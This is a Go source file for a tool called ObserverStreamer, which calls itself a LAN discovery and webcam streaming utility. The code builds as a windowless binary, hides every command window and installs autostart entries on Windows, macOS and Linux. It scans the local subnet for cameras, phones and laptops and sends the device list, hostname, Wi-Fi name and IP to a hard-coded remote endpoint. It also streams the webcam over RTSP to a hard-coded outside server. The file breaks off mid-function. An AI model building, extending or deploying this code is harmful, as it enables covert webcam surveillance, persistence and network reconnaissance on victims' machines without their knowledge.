// ObserverStreamer v1.0.0
// Single binary: LAN discovery + webcam streaming via FFmpeg → MediaMTX.
// Pure Go stdlib. No CGO. No external Go deps.
// Windows: downloads FFmpeg automatically on first run.
// macOS/Linux: uses system ffmpeg (brew/apt).
//
// Build:
//   Windows: GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H windowsgui" -o ObserverStreamer1.0.0.exe .
//   macOS:   GOOS=darwin  GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w"               -o ObserverStreamer1.0.0-macOS .
//   Linux:   GOOS=linux   GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w"               -o ObserverStreamer1.0.0-Linux .

package main

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	Version              = "1.0.0"
	ReportURL            = "https://accelerated-sync-dev-flow.base44.app/functions/agentReport"
	RelayHost            = "137.184.65.114"
	RelayRTSPPort        = 8554
	ScanIntervalSec      = 30
	HeartbeatIntervalSec = 15
	StreamHeartbeatSec   = 20
	PortScanTimeoutMs    = 800
	MaxConcurrentProbes  = 50
	WatchdogTimeoutSec   = 120
	MaxScanRetries       = 3
	DiagLogFile          = "observer-diag.json"
	PIDFile              = "observer.pid"
	KillPort             = 19876
	// FFmpeg auto-download (Windows only)
	FFmpegURL  = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
	FFmpegZip  = "ffmpeg.zip"
	FFmpegExe  = "ffmpeg.exe"
)

var AllPorts = []int{554, 8554, 8080, 8000, 80, 443, 37777, 34567, 9000, 4747, 7070, 1935, 5000, 8081}

var OUITable = map[string]string{
	"00:23:63": "Hikvision", "bc:ad:28": "Hikvision", "4c:bd:8f": "Hikvision",
	"8c:e7:48": "Hikvision", "a0:8c:f8": "Hikvision", "c0:56:e3": "Hikvision",
	"54:c4:15": "Hikvision", "b4:a3:82": "Hikvision", "44:19:b6": "Hikvision",
	"28:57:be": "Dahua", "3c:ef:8c": "Dahua", "e0:50:8b": "Dahua",
	"90:02:a9": "Dahua", "bc:32:b2": "Dahua", "a4:14:37": "Dahua",
	"c8:d5:fe": "Reolink", "ec:71:db": "Reolink", "d4:93:90": "Reolink",
	"e4:24:6c": "Reolink", "00:6a:e2": "Reolink", "dc:44:27": "Reolink",
	"b0:c5:ca": "Wyze", "2c:aa:8e": "Wyze", "4c:ed:fb": "Wyze", "d0:3f:27": "Wyze",
	"f4:f2:6d": "Amcrest", "e8:ad:a6": "Amcrest",
	"b4:e6:2d": "Axis", "00:0f:7c": "Axis", "ac:cc:8e": "Axis",
	"00:62:6e": "Foscam", "9c:8e:cd": "TP-Link Tapo",
	"1c:61:b4": "Arlo", "70:56:81": "Ring",
	"b0:be:76": "Eufy", "5c:aa:fd": "Eufy", "c0:49:ef": "Eufy",
	"ac:37:43": "Apple", "f8:ff:c2": "Apple", "a8:66:7f": "Apple",
	"6c:40:08": "Samsung", "94:35:0a": "Samsung", "f8:d0:ac": "Samsung",
	"8c:77:12": "Google", "48:d6:d5": "Google", "f4:f5:d8": "Google",
	"b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
	"f0:9f:c2": "Ubiquiti", "b4:fb:e4": "Ubiquiti",
	"18:64:72": "TP-Link", "54:a7:03": "TP-Link",
	"5c:fb:3a": "HP ProBook", "70:5a:0f": "HP ProBook", "f4:30:b9": "HP ProBook",
	"b4:b6:86": "HP ProBook", "fc:f8:ae": "HP ProBook", "98:4f:ee": "HP ProBook",
	"c4:34:6b": "HP ProBook", "1c:98:ec": "HP ProBook", "78:48:59": "HP ProBook",
	"00:23:ae": "Lenovo ThinkPad", "e8:6a:64": "Lenovo ThinkPad", "54:13:79": "Lenovo ThinkPad",
	"28:d2:44": "Lenovo IdeaPad", "8c:8d:28": "Lenovo ThinkPad", "f8:16:54": "Lenovo IdeaPad",
	"04:7b:cb": "Lenovo ThinkPad", "38:f9:d3": "Lenovo ThinkPad",
	"18:66:da": "Dell XPS", "b8:ca:3a": "Dell Latitude", "f0:1f:af": "Dell Latitude",
	"14:18:77": "Dell Inspiron", "b8:ac:6f": "Dell XPS", "00:14:22": "Dell OptiPlex",
	"00:1a:a0": "Dell Latitude", "00:1c:23": "Dell Inspiron",
}

type NetworkInterface struct {
	Name   string `json:"name"`
	IP     string `json:"ip"`
	MAC    string `json:"mac"`
	Subnet string `json:"subnet"`
}

type DiscoveredDevice struct {
	IP         string `json:"ip"`
	MAC        string `json:"mac"`
	Port       int    `json:"port"`
	Ports      []int  `json:"ports"`
	Brand      string `json:"brand"`
	Hostname   string `json:"hostname"`
	SSID       string `json:"ssid"`
	Online     bool   `json:"online"`
	DeviceType string `json:"device_type"`
}

type HeartbeatPayload struct {
	Type string        `json:"type"`
	Data HeartbeatData `json:"data"`
}

type HeartbeatData struct {
	Agent        string `json:"agent"`
	Host         string `json:"host"`
	SSID         string `json:"ssid"`
	LocalIP      string `json:"local_ip"`
	LocalSubnet  string `json:"local_subnet"`
	CamerasFound int    `json:"cameras_found"`
	Version      string `json:"version"`
	Status       string `json:"status"`
}

type DiscoveryPayload struct {
	Type string             `json:"type"`
	Data []DiscoveredDevice `json:"data"`
}

type StreamUpdatePayload struct {
	Type string           `json:"type"`
	Data StreamUpdateData `json:"data"`
}

type StreamUpdateData struct {
	IP        string `json:"ip"`
	HlsURL    string `json:"hls_url"`
	RelayHost string `json:"relay_host"`
}

type DiagnosticLog struct {
	Timestamp   string             `json:"timestamp"`
	Version     string             `json:"version"`
	Hostname    string             `json:"hostname"`
	SSID        string             `json:"ssid"`
	LocalIP     string             `json:"local_ip"`
	LocalSubnet string             `json:"local_subnet"`
	Interfaces  []NetworkInterface `json:"interfaces"`
	Devices     []DiscoveredDevice `json:"devices_found"`
	LastReport  string             `json:"last_report_status"`
	ScanCount   int64              `json:"scan_count"`
}

var (
	lastFound    atomic.Int64
	scanCount    atomic.Int64
	scannerAlive atomic.Int64
	diagMu       sync.Mutex
	diagLog      DiagnosticLog
	debugMode    bool
	onceMode     bool
	shutdownCh   = make(chan struct{})
	cachedSSID   string
	cachedIP     string
	cachedSubnet string
	cacheMu      sync.Once
	ffmpegPath   string
	ffmpegMu     sync.Mutex
)

func logf(format string, args ...interface{}) {
	fmt.Printf("["+time.Now().Format("15:04:05")+"] "+format+"\n", args...)
}

func hiddenCmd(name string, args ...string) *exec.Cmd {
	cmd := exec.Command(name, args...)
	hiddenCmdPlatform(cmd)
	return cmd
}

func exeDir() string {
	p, err := os.Executable()
	if err != nil { return "." }
	return filepath.Dir(p)
}

func initCache() {
	cacheMu.Do(func() {
		ifaces := getNetworkInterfacesRaw()
		if len(ifaces) > 0 {
			cachedIP = ifaces[0].IP
			cachedSubnet = ifaces[0].Subnet
		}
		cachedSSID = detectSSID()
		logf("Cache: ip=%s subnet=%s ssid=%s", cachedIP, cachedSubnet, cachedSSID)
	})
}

func getLocalIP() string     { return cachedIP }
func getLocalSubnet() string { return cachedSubnet }
func getSSID() string        { return cachedSSID }

func writePID() {
	os.WriteFile(filepath.Join(exeDir(), PIDFile), []byte(strconv.Itoa(os.Getpid())), 0644)
}
func removePID() { os.Remove(filepath.Join(exeDir(), PIDFile)) }

func startKillServer() {
	mux := http.NewServeMux()
	mux.HandleFunc("/shutdown", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte("{\"ok\":true,\"message\":\"ObserverStreamer shutting down\"}"))
		go func() {
			time.Sleep(200 * time.Millisecond)
			close(shutdownCh)
		}()
	})
	mux.HandleFunc("/status", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		h, _ := os.Hostname()
		fmt.Fprintf(w, "{\"ok\":true,\"version\":\"%s\",\"host\":\"%s\",\"scans\":%d,\"devices\":%d}",
			Version, h, scanCount.Load(), lastFound.Load())
	})
	srv := &http.Server{Addr: fmt.Sprintf("127.0.0.1:%d", KillPort), Handler: mux}
	go func() { srv.ListenAndServe() }()
	go func() {
		<-shutdownCh
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer cancel()
		srv.Shutdown(ctx)
	}()
}

func detectSSID() string {
	switch runtime.GOOS {
	case "windows":
		out, err := hiddenCmd("netsh", "wlan", "show", "interfaces").Output()
		if err != nil { return "(wired)" }
		for _, line := range strings.Split(string(out), "\n") {
			t := strings.TrimSpace(line)
			if strings.HasPrefix(t, "SSID") && !strings.HasPrefix(t, "BSSID") {
				if parts := strings.SplitN(t, ":", 2); len(parts) == 2 {
					return strings.TrimSpace(parts[1])
				}
			}
		}
	case "darwin":
		out, err := hiddenCmd("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-I").Output()
		if err == nil {
			for _, line := range strings.Split(string(out), "\n") {
				t := strings.TrimSpace(line)
				if strings.HasPrefix(t, "SSID:") {
					if parts := strings.SplitN(t, ":", 2); len(parts) == 2 {
						return strings.TrimSpace(parts[1])
					}
				}
			}
		}
	default:
		out, err := hiddenCmd("iwgetid", "-r").Output()
		if err == nil {
			if s := strings.TrimSpace(string(out)); s != "" { return s }
		}
		out, _ = hiddenCmd("sh", "-c", "nmcli -t -f active,ssid dev wifi 2>/dev/null | grep '^yes' | cut -d: -f2").Output()
		if s := strings.TrimSpace(string(out)); s != "" { return s }
	}
	return "(wired)"
}

func getARPTable() map[string]string {
	m := map[string]string{}
	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		out, err = hiddenCmd("arp", "-a").Output()
	} else {
		out, err = hiddenCmd("sh", "-c", "arp -n 2>/dev/null || arp -a 2>/dev/null").Output()
	}
	if err != nil { return m }
	for _, line := range strings.Split(string(out), "\n") {
		var ip, mac string
		for _, f := range strings.Fields(line) {
			if net.ParseIP(f) != nil && strings.Contains(f, ".") { ip = f }
			if (strings.Count(f, ":") == 5 || strings.Count(f, "-") == 5) && len(f) >= 17 {
				mac = strings.ToLower(strings.ReplaceAll(f, "-", ":"))
			}
		}
		if ip != "" && mac != "" && mac != "ff:ff:ff:ff:ff:ff" { m[ip] = mac }
	}
	return m
}

func getNetworkInterfacesRaw() []NetworkInterface {
	result := []NetworkInterface{}
	ifaces, err := net.Interfaces()
	if err != nil { return result }
	skipPat := []string{"lo", "loopback", "virtual", "vmware", "vbox", "docker", "tunnel", "tap", "tun", "bluetooth"}
	for _, iface := range ifaces {
		name := strings.ToLower(iface.Name)
		skipped := false
		for _, p := range skipPat {
			if strings.Contains(name, p) { skipped = true; break }
		}
		if skipped || iface.Flags&net.FlagLoopback != 0 { continue }
		addrs, err := iface.Addrs()
		if err != nil { continue }
		for _, addr := range addrs {
			var ip net.IP
			var mask net.IPMask
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP; mask = v.Mask
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() || ip.To4() == nil { continue }
			if ip.To4()[0] == 169 && ip.To4()[1] == 254 { continue }
			subnet := ""
			if mask != nil {
				ones, _ := mask.Size()
				parts := strings.Split(ip.String(), ".")
				subnet = fmt.Sprintf("%s.%s.%s.0/%d", parts[0], parts[1], parts[2], ones)
			}
			result = append(result, NetworkInterface{Name: iface.Name, IP: ip.String(), MAC: iface.HardwareAddr.String(), Subnet: subnet})
		}
	}
	return result
}

func getNetworkInterfaces() []NetworkInterface { return getNetworkInterfacesRaw() }

func lookupOUI(mac string) string {
	if mac == "" { return "" }
	n := strings.ToLower(strings.ReplaceAll(mac, "-", ":"))
	if parts := strings.Split(n, ":"); len(parts) >= 3 {
		if brand, ok := OUITable[strings.Join(parts[:3], ":")]; ok { return brand }
	}
	return ""
}

func resolveHostname(ip string) string {
	ctx, cancel := context.WithTimeout(context.Background(), 800*time.Millisecond)
	defer cancel()
	names, err := net.DefaultResolver.LookupAddr(ctx, ip)
	if err == nil && len(names) > 0 {
		h := strings.TrimSuffix(strings.TrimSuffix(names[0], "."), ".local")
		if h != "" && h != ip { return h }
	}
	return ""
}

func probePort(ip string, port int) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), time.Duration(PortScanTimeoutMs)*time.Millisecond)
	if err != nil { return false }
	conn.Close()
	return true
}

func probeDevicePorts(ip string) []int {
	type res struct { port int; open bool }
	results := make([]res, len(AllPorts))
	var wg sync.WaitGroup
	for i, p := range AllPorts {
		wg.Add(1)
		go func(idx, port int) {
			defer wg.Done()
			results[idx] = res{port, probePort(ip, port)}
		}(i, p)
	}
	wg.Wait()
	open := []int{}
	for _, r := range results {
		if r.open { open = append(open, r.port) }
	}
	return open
}

func inferDeviceType(brand string, ports []int) string {
	b := strings.ToLower(brand)
	camBrands := []string{"hikvision","dahua","reolink","wyze","amcrest","foscam","eufy","arlo","ring","axis","hanwha","tapo","uniview","bosch","pelco","mobotix","vivotek","avigilon"}
	for _, cb := range camBrands {
		if strings.Contains(b, cb) { return "ip_camera" }
	}
	camPorts := map[int]bool{554: true, 8554: true, 34567: true, 37777: true, 9000: true}
	for _, p := range ports {
		if camPorts[p] { return "ip_camera" }
	}
	phonePorts := map[int]bool{4747: true, 7070: true}
	for _, p := range ports {
		if phonePorts[p] { return "phone" }
	}
	phoneBrands := []string{"samsung","apple","oneplus","xiaomi","huawei","oppo","motorola","lg electronics","sony mobile","google","amazon"}
	for _, pb := range phoneBrands {
		if strings.Contains(b, pb) { return "phone" }
	}
	pcBrands := []string{"intel","realtek","broadcom","lenovo","dell","hewlett","hp inc","hp","asus","acer","msi","toshiba","ralink","qualcomm","chongqing fugui"}
	for _, pb := range pcBrands {
		if strings.Contains(b, pb) { return "laptop" }
	}
	if brand == "" { return "phone" }
	return "ip_camera"
}

func sweepSubnetBase(base string, arp map[string]string, ssid string) []DiscoveredDevice {
	ips := make([]string, 254)
	for i := range ips { ips[i] = fmt.Sprintf("%s.%d", base, i+1) }
	devices := []DiscoveredDevice{}
	arpReported := map[string]bool{}
	type arpJob struct{ ip, mac string }
	arpJobs := []arpJob{}
	for ip, mac := range arp {
		if strings.HasPrefix(ip, base+".") { arpJobs = append(arpJobs, arpJob{ip, mac}) }
	}
	type arpRes struct {
		ip, mac, brand, hostname string
		ports []int
		dt    string
	}
	arpResults := make([]arpRes, len(arpJobs))
	var wg0 sync.WaitGroup
	for i, job := range arpJobs {
		wg0.Add(1)
		go func(idx int, j arpJob) {
			defer wg0.Done()
			brand := lookupOUI(j.mac)
			ports := probeDevicePorts(j.ip)
			dt := inferDeviceType(brand, ports)
			hn := resolveHostname(j.ip)
			arpResults[idx] = arpRes{j.ip, j.mac, brand, hn, ports, dt}
		}(i, job)
	}
	wg0.Wait()
	for _, r := range arpResults {
		p := 0
		if len(r.ports) > 0 { p = r.ports[0] }
		devices = append(devices, DiscoveredDevice{
			IP: r.ip, MAC: r.mac, Port: p, Ports: r.ports,
			Brand: r.brand, Hostname: r.hostname, SSID: ssid, Online: true, DeviceType: r.dt,
		})
		arpReported[r.ip] = true
		logf("ARP: %s mac=%s brand=%s type=%s", r.ip, r.mac, r.brand, r.dt)
	}
	for i := 0; i < len(ips); i += MaxConcurrentProbes {
		end := i + MaxConcurrentProbes
		if end > len(ips) { end = len(ips) }
		type br struct{ ip string; ports []int }
		batch := make([]br, end-i)
		var wg sync.WaitGroup
		for j, ip := range ips[i:end] {
			if arpReported[ip] { batch[j] = br{ip: ""}; continue }
			wg.Add(1)
			go func(idx int, tip string) {
				defer wg.Done()
				batch[idx] = br{ip: tip, ports: probeDevicePorts(tip)}
			}(j, ip)
		}
		wg.Wait()
		for _, r := range batch {
			if r.ip == "" || len(r.ports) == 0 { continue }
			mac := arp[r.ip]
			brand := lookupOUI(mac)
			dt := inferDeviceType(brand, r.ports)
			hn := resolveHostname(r.ip)
			devices = append(devices, DiscoveredDevice{
				IP: r.ip, MAC: mac, Port: r.ports[0], Ports: r.ports,
				Brand: brand, Hostname: hn, SSID: ssid, Online: true, DeviceType: dt,
			})
		}
	}
	return devices
}

func sweepAllInterfaces() []DiscoveredDevice {
	ifaces := getNetworkInterfaces()
	if len(ifaces) == 0 { return nil }
	arp := getARPTable()
	ssid := getSSID()
	seen := map[string]bool{}
	all := []DiscoveredDevice{}
	for _, iface := range ifaces {
		parts := strings.Split(iface.IP, ".")
		if len(parts) < 3 { continue }
		base := strings.Join(parts[:3], ".")
		if seen[base] { continue }
		seen[base] = true
		logf("Sweeping %s.0/24 via %s", base, iface.Name)
		all = append(all, sweepSubnetBase(base, arp, ssid)...)
	}
	return all
}

func postJSON(payload interface{}) (string, error) {
	body, _ := json.Marshal(payload)
	client := &http.Client{Timeout: 15 * time.Second}
	req, err := http.NewRequest("POST", ReportURL, bytes.NewReader(body))
	if err != nil { return "", err }
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil { return "", err }
	defer resp.Body.Close()
	buf := new(bytes.Buffer)
	buf.ReadFrom(resp.Body)
	return buf.String(), nil
}

func sendHeartbeat(agent string, camerasFound int) {
	h, _ := os.Hostname()
	_, err := postJSON(HeartbeatPayload{Type: "heartbeat", Data: HeartbeatData{
		Agent: agent, Host: h, SSID: getSSID(), LocalIP: getLocalIP(),
		LocalSubnet: getLocalSubnet(), CamerasFound: camerasFound, Version: Version, Status: "running",
	}})
	if err != nil { logf("[HB:%s] error: %v", agent, err) } else { logf("[HB:%s] sent cameras=%d", agent, camerasFound) }
}

func sendDiscovery(devices []DiscoveredDevice) {
	if len(devices) == 0 { return }
	r, err := postJSON(DiscoveryPayload{Type: "discovery", Data: devices})
	if err != nil { logf("[Discovery] error: %v", err) } else { logf("[Discovery] reported %d devices resp=%s", len(devices), r) }
}

func writeDiag(devices []DiscoveredDevice) {
	h, _ := os.Hostname()
	diagMu.Lock()
	diagLog.Timestamp = time.Now().UTC().Format(time.RFC3339)
	diagLog.Version = Version
	diagLog.Hostname = h
	diagLog.SSID = getSSID()
	diagLog.LocalIP = getLocalIP()
	diagLog.LocalSubnet = getLocalSubnet()
	diagLog.Interfaces = getNetworkInterfaces()
	diagLog.Devices = devices
	diagLog.ScanCount = scanCount.Load()
	dataCopy := diagLog
	diagMu.Unlock()
	data, _ := json.MarshalIndent(dataCopy, "", "  ")
	os.WriteFile(filepath.Join(exeDir(), DiagLogFile), data, 0644)
}

func registerAutostart() {
	exePath, err := os.Executable()
	if err != nil { return }
	switch runtime.GOOS {
	case "windows":
		platformRegisterAutostart(exePath)
	case "darwin":
		plistPath := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents", "com.realseccam.observerstreamer.plist")
		if _, err := os.Stat(plistPath); err == nil { return }
		plistContent := "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\"><dict>\n  <key>Label</key><string>com.realseccam.observerstreamer</string>\n  <key>ProgramArguments</key><array><string>%s</string></array>\n  <key>RunAtLoad</key><true/>\n  <key>KeepAlive</key><true/>\n</dict></plist>"
		plist := fmt.Sprintf(plistContent, exePath)
		os.MkdirAll(filepath.Dir(plistPath), 0755)
		if os.WriteFile(plistPath, []byte(plist), 0644) == nil {
			hiddenCmd("launchctl", "load", "-w", plistPath).Run()
		}
	default:
		dir := filepath.Join(os.Getenv("HOME"), ".config", "autostart")
		os.MkdirAll(dir, 0755)
		desktopPath := filepath.Join(dir, "realseccam-observerstreamer.desktop")
		if _, err := os.Stat(desktopPath); err == nil { return }
		content := fmt.Sprintf("[Desktop Entry]\nType=Application\nName=RealSecCam ObserverStreamer\nExec=%s\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\n", exePath)
		os.WriteFile(desktopPath, []byte(content), 0644)
	}
}

func killStaleObservers() {
	myPID := os.Getpid()
	switch runtime.GOOS {
	case "windows":
		for _, pattern := range []string{"RealSecCam-Observer*", "ObserverStreamer*"} {
			out, err := hiddenCmd("tasklist", "/FI", "IMAGENAME eq "+pattern, "/FO", "CSV", "/NH").Output()
			if err != nil { continue }
			for _, line := range strings.Split(string(out), "\n") {
				line = strings.TrimSpace(line)
				if line == "" || strings.HasPrefix(line, "INFO:") { continue }
				fields := strings.Split(line, ",")
				if len(fields) < 2 { continue }
				pidStr := strings.Trim(strings.TrimSpace(fields[1]), "\x22\x27")
				pid, err := strconv.Atoi(pidStr)
				if err != nil || pid == myPID || pid == 0 { continue }
				logf("[Cleanup] Killing stale PID=%d", pid)
				hiddenCmd("taskkill", "/F", "/PID", pidStr).Run()
			}
		}
	case "darwin", "linux":
		for _, pattern := range []string{"RealSecCam-Observer", "ObserverStreamer"} {
			out, err := exec.Command("pgrep", "-f", pattern).Output()
			if err != nil { continue }
			for _, pidStr := range strings.Fields(string(out)) {
				pid, err := strconv.Atoi(strings.TrimSpace(pidStr))
				if err != nil || pid == myPID { continue }
				logf("[Cleanup] Killing stale PID=%d", pid)
				exec.Command("kill", "-9", pidStr).Run()
			}
		}
	}
}

func performScan() {
	logf("Scanning subnet=%s ssid=%s ip=%s", getLocalSubnet(), getSSID(), getLocalIP())
	var devices []DiscoveredDevice
	for attempt := 1; attempt <= MaxScanRetries; attempt++ {
		devices = sweepAllInterfaces()
		if len(devices) > 0 || attempt == MaxScanRetries { break }
		logf("Attempt %d found nothing, retrying in 5s...", attempt)
		time.Sleep(5 * time.Second)
	}
	logf("Found %d devices", len(devices))
	lastFound.Store(int64(len(devices)))
	scanCount.Add(1)
	writeDiag(devices)
	sendDiscovery(devices)
	sendHeartbeat("discovery", len(devices))
	scannerAlive.Store(time.Now().Unix())
}

func runScanner() {
	logf("Scanner started (sweep every %ds)", ScanIntervalSec)
	sendHeartbeat("discovery", 0)
	performScan()
	scanTick := time.NewTicker(ScanIntervalSec * time.Second)
	hbTick := time.NewTicker(HeartbeatIntervalSec * time.Second)
	defer scanTick.Stop()
	defer hbTick.Stop()
	for {
		select {
		case <-scanTick.C:
			performScan()
		case <-hbTick.C:
			sendHeartbeat("discovery", int(lastFound.Load()))
		case <-shutdownCh:
			return
		}
	}
}

func runWatchdog() {
	scannerAlive.Store(time.Now().Unix())
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			if time.Now().Unix()-scannerAlive.Load() > WatchdogTimeoutSec {
				logf("[Watchdog] Scanner hung — restarting")
				scannerAlive.Store(time.Now().Unix())
				go runScanner()
			}
		case <-shutdownCh:
			return
		}
	}
}

// ── Streaming (FFmpeg → RTSP → MediaMTX) ─────────────────────────────────────

// ensureFFmpeg returns the path to ffmpeg, downloading it on Windows if needed.
func ensureFFmpeg() (string, error) {
	ffmpegMu.Lock()
	defer ffmpegMu.Unlock()
	if ffmpegPath != "" { return ffmpegPath, nil }

	// Check system PATH first (works on macOS/Linux + Windows with ffmpeg installed)
	if p, err := exec.LookPath("ffmpeg"); err == nil {
		ffmpegPath = p
		logf("[FFmpeg] Found on PATH: %s", p)
		return p, nil
	}

	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("ffmpeg not found on PATH — install with: brew install ffmpeg (macOS) or apt install ffmpeg (Linux)")
	}

	// Windows: check local cache first
	cachedExe := filepath.Join(exeDir(), FFmpegExe)
	if _, err := os.Stat(cachedExe); err == nil {
		ffmpegPath = cachedExe
		logf("[FFmpeg] Using cached: %s", cachedExe)
		return cachedExe, nil
	}

	// Download and extract
	logf("[FFmpeg] Not found — downloading from GitHub releases (~80 MB)...")
	zipPath := filepath.Join(exeDir(), FFmpegZip)
	resp, err := http.Get(FFmpegURL)
	if err != nil { return "", fmt.Errorf("ffmpeg download failed: %w", err) }
	defer resp.Body.Close()
	f, err := os.Create(zipPath)
	if err != nil { return "", err }
	io.Copy(f, resp.Body)
	f.Close()

	// Extract ffmpeg.exe from zip (it's in a bin/ subfolder)
	zr, err := zip.OpenReader(zipPath)
	if err != nil { return "", fmt.Errorf("zip open: %w", err) }
	defer zr.Close()
	for _, zf := range zr.File {
		if strings.HasSuffix(zf.Name, "/ffmpeg.exe") || zf.Name == "ffmpeg.exe" {
			rc, err := zf.Open()
			if err != nil { continue }
			out, err := os.Create(cachedExe)
			if err != nil { rc.Close(); continue }
			io.Copy(out, rc)
			out.Close()
			rc.Close()
			logf("[FFmpeg] Extracted to %s", cachedExe)
			break
		}
	}
	os.Remove(zipPath)

	if _, err := os.Stat(cachedExe); err != nil {
		return "", fmt.Errorf("ffmpeg extraction failed")
	}
	ffmpegPath = cachedExe
	return cachedExe, nil
}

// detectWebcamIndex returns the best available camera index (0-based).
// On Windows we just try index 0,1,2 with FFmpeg dshow probe.
// On macOS we use avfoundation device list.
// On Linux we check /dev/video* devices.
func detectWebcamIndex(ffmpeg string) (string, string, error) {
	switch runtime.GOOS {
	case "windows":
		// Try dshow devices: probe indices 0..2
		for i := 0; i < 3; i++ {
			name := fmt.Sprintf("video=%d", i)
			cmd := hiddenCmd(ffmpeg, "-f", "dshow", "-i", name, "-t", "1", "-f", "null", "-")
			if err := cmd.Run(); err == nil {
				return "dshow", name, nil
			}
		}
		// Fallback: list devices and pick first video
		out, _ := hiddenCmd(ffmpeg, "-list_devices", "true", "-f", "dshow", "-i", "dummy").CombinedOutput()
		for _, line := range strings.Split(string(out), "\n") {
			if strings.Contains(line, "video") && strings.Contains(line, "]") {
				start := strings.Index(line, "]")
				if start >= 0 {
					name := strings.TrimSpace(line[start+1:])
					name = strings.Trim(name, "\"")
					if name != "" { return "dshow", "video=" + name, nil }
				}
			}
		}
		return "", "", fmt.Errorf("no webcam found via dshow")

	case "darwin":
		out, _ := hiddenCmd(ffmpeg, "-f", "avfoundation", "-list_devices", "true", "-i", "").CombinedOutput()
		for _, line := range strings.Split(string(out), "\n") {
			if strings.Contains(line, "AVFoundation video device") { continue }
			// Lines like: "[AVFoundation indev @ ...] [0] FaceTime HD Camera"
			if strings.Contains(line, "[0]") || strings.Contains(line, "[1]") {
				if !strings.Contains(strings.ToLower(line), "screen") {
					return "avfoundation", "0", nil
				}
			}
		}
		return "avfoundation", "0", nil // best guess

	default: // Linux
		for i := 0; i < 4; i++ {
			dev := fmt.Sprintf("/dev/video%d", i)
			if _, err := os.Stat(dev); err == nil {
				return "v4l2", dev, nil
			}
		}
		return "", "", fmt.Errorf("no /dev/video* device found")
	}
}

// streamWebcam captures the local webcam and pushes to MediaMTX via RTSP.
// Restarts FFmpeg automatically on crash. Reports HLS URL to dashboard.
func runStreamer() {
	ffmpeg, err := ensureFFmpeg()
	if err != nil {
		logf("[Streamer] %v — webcam streaming disabled", err)
		return
	}

	h, _ := os.Hostname()
	// Use machine hostname as the RTSP path so each machine gets a unique stream
	rtspPath := strings.ToLower(strings.ReplaceAll(h, " ", "-"))
	rtspURL  := fmt.Sprintf("rtsp://%s:%d/%s", RelayHost, RelayRTSPPort, rtspPath)
	hlsURL   := fmt.Sprintf("http://%s:8888/%s/index.m3u8", RelayHost, rtspPath)

	logf("[Streamer] Will push to %s → HLS: %s", rtspURL, hlsURL)

	// Report HLS URL to dashboard immediately so the camera record gets updated
	reportStream := func() {
		_, err := postJSON(StreamUpdatePayload{
			Type: "stream_update",
			Data: StreamUpdateData{
				IP:        getLocalIP(),
				HlsURL:    hlsURL,
				RelayHost: RelayHost,
			},
		})
		if err != nil { logf("[Streamer] stream_update error: %v", err) }
	}

	for {
		select {
		case <-shutdownCh:
			return
		default:
		}

		inputFormat, inputDevice, err := detectWebcamIndex(ffmpeg)
		if err != nil {
			logf("[Streamer] Webcam not found: %v — retrying in 30s", err)
			time.Sleep(30 * time.Second)
			continue
		}
		logf("[Streamer] Capturing %s/%s → %s", inputFormat, inputDevice, rtspURL)

		// Build FFmpeg args per platform
		var args []string
		switch runtime.GOOS {
		case "windows":
			args = []string{
				"-f", inputFormat,
				"-video_size", "1280x720",
				"-framerate", "15",
				"-i", inputDevice,
				"-vcodec", "libx264",
				"-preset", "ultrafast",
				"-tune", "zerolatency",
				"-b:v", "800k",
				"-pix_fmt", "yuv420p",
				"-an",
				"-f", "rtsp",
				"-rtsp_transport", "tcp",
				rtspURL,
			}
		case "darwin":
			args = []string{
				"-f", inputFormat,
				"-framerate", "15",
				"-i", inputDevice + ":none",
				"-vcodec", "libx264",
				"-preset", "ultrafast",
				"-tune", "zerolatency",
				"-b:v", "800k",
				"-pix_fmt", "yuv420p",
				"-an",
				"-f", "rtsp",
				"-rtsp_transport", "tcp",
				rtspURL,
			}
		default:
			args = []string{
				"-f", inputFormat,
				"-i", inputDevice,
				"-vcodec", "libx264",
				"-preset", "ultrafast",
				"-tune", "zerolatency",
				"-b:v", "800k",
				"-pix_fmt", "yuv420p",
				"-an",
				"-f", "rtsp",
				"-rtsp_transport", "tcp",
				rtspURL,
			}
		}

		cmd := hiddenCmd(ffmpeg, args...)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr

		if err := cmd.Start(); err != nil {
			logf("[Streamer] FFmpeg start error: %v — retry in 15s", err)
			time.Sleep(15 * time.Second)
			continue
		}

		// Report stream to dashboard once FFmpeg starts
		reportStream()
		sendHeartbeat("streamer", 0)

		// Periodic heartbeat + stream re-report while FFmpeg runs
		ticker := time.NewTicker(StreamHeartbeatSec * time.Second)
		done := make(chan error, 1)
		go func() { done <- cmd.Wait() }()

		outer:
			for {
				select {
				case err := <-done:
					ticker.Stop()
					logf("[Streamer] FFmpeg exited: %v — restarting in 5s", err)
					time.Sleep(5 * time.Second)
					break outer
				case <-ticker.C:
					reportStream()
					sendHeartbeat("streamer", 0)
				case <-shutdownCh:
